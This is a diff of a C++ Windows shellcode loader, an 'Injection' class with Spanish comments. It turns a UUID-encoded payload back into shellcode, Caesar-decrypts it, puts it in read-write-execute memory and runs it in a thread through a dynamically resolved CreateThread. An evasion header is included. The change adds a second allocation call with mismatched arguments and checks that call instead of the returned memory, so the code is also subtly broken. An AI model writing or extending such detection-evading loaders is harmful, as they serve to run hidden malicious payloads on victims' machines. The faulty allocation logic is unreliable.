@@ -2,8 +2,10 @@
 #include "Crypt.h"
 #include "evasion\Evasion.h"
 #include <iomanip>
+#include <sstream>
 
 Injection::Injection() {
+
 	this->shellcode = _uuidListToShellcode(this->uuid_shellcode_vector);
 	
 	this->_caesarDecrypt(this->shellcode, this->key);
@@ -50,11 +52,13 @@ VOID Injection::_caesarDecrypt(std::vector<unsigned char>& data, unsigned char k
 	}
 }
 
+/*
 VOID Injection::_caesarEncrypt(std::vector<unsigned char>& data, unsigned char key) {
 	for (auto& byte : data) {
 		byte = (byte + key) % 0x100;  // Descifrado César con clave
 	}
 }
+*/
 
 VOID Injection::printShellcode() {
 	std::cout << "Shellcode cifrado con llave 0xDE:" << std::endl;
@@ -78,7 +82,8 @@ VOID Injection::_cleanUpResources(HANDLE hThread, PVOID shellcode_exec) {
 
 PVOID Injection::_allocateExecutableMemory(SIZE_T size) {
 	PVOID memory = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	if (memory == NULL) {
+
+	if (_API.VirtualAllocEx(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == NULL) { 
 		std::cout << "No se pundo alojar memoria" << std::endl;
 	}
 	return memory;
@@ -107,6 +112,7 @@ CreateThreadFunc Injection::_getCreateThreadFunction(void) {
 
 HANDLE Injection::_createShellcodeThread(PVOID shellcode_exec, DWORD& threadID) {
 	CreateThreadFunc pCreateThread = this->_getCreateThreadFunction();
+
 	if (pCreateThread == nullptr) {
 		return NULL;
 	}
